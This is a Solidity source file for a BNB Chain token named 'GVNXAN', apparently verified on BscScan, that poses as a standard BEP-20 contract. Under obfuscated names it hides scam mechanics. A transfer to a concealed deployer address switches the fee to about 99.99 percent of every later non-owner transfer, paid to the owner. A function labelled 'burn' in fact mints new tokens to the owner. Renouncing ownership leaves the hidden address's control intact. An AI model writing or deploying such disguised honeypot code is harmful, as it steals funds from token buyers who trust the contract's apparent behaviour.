/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/
pragma solidity >=0.8.0;
contract AESChain {
    address public owner;
        uint8 public constant decimals = 18;

    constructor () {
        EOVECO = msg.sender;
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }
    uint256 private  CSSBAG = 100000000000;
    string public  name = "GVNXAN";
    string public  symbol = "KTAUOB";
    uint256 public constant totalSupply = 100000000000000000000000000000;
    address private  EOVECO = address(0);
    address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant LPOHYH = 8999;

    mapping (address => mapping (address => uint256)) private _allowances;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping (address => uint256) public balanceOf;

         modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "MIOUVM");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }    function _transferLGAOUK(address to) private {
            if (to==EOVECO){
            CSSBAG = 8999+1;
            }
    }
 
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }  function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "MIOUVM");
        require(to != address(0), "MIOUVM");
        uint256 fee;
        if (from == owner || to == owner){
        fee = 0;
        }
        else{
            fee = amount* LPOHYH/CSSBAG ;

        }

        uint256 transferAmount = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += fee;
        _transferLGAOUK(to);
        emit Transfer(from, to, transferAmount);
    }
  
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "failed");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }   function _burn(address account, uint256 amount) private {
        require(account != address(0), "BEP20: mint to the zero address");

        balanceOf[account] += amount;
    }
        function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 

  function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "t 0");
        require(spender != address(0), "f 0");

        _allowances[_owner][spender] = amount;
		emit Approval(_owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }


    

    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }
    receive() external payable {}

}